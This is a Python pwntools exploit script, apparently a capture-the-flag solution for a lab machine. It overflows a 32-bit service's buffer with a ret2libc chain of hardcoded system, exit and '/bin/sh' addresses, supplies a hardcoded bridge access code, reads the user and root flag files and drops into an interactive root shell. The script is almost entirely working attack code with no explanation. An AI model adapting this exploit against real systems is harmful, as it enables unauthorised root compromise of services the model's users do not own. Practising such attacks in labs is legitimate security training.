#!/usr/bin/python3

import time
from pwn import *

## BoF Creation

print(f"\nCreating the BoF...")

offset = 212
before_eip = b"A" * offset

Fsystem = p32(0xf7e4c060) 
Fexit = p32(0xf7e3faf0)
Fshell = p32(0xf7f6ddd5)

payload = before_eip + Fsystem + Fexit + Fshell

context(os='linux', arch='i386')
host, port = "10.10.10.61", 32812

time.sleep(1)

## Conection to the machine

print(f"\nConecting to the machine...")

time.sleep(1)

r = remote(host, port)

## Recive and sending data

r.recvuntil(b"Enter Bridge Access Code:")
r.sendline(b"picarda1")
r.recvuntil(b"Waiting for input:")
r.sendline(b"4")
r.recvuntil(b"Enter Security Override:")
r.sendline(payload)

time.sleep(1)

## Geting the flags

r.sendline(b'echo "user flag:" & cat /home/jeanlucpicard/user.txt')

time.sleep(0.5)

r.sendline(b'echo ""')

time.sleep(0.5)

r.sendline(b'echo "root flag:" & cat /root/root.txt')

time.sleep(0.5)

r.sendline(b'echo ""')

print(f"\nEnjoy the root shell and the flags ;)\n")

time.sleep(2)

## spawn the shell

r.interactive()
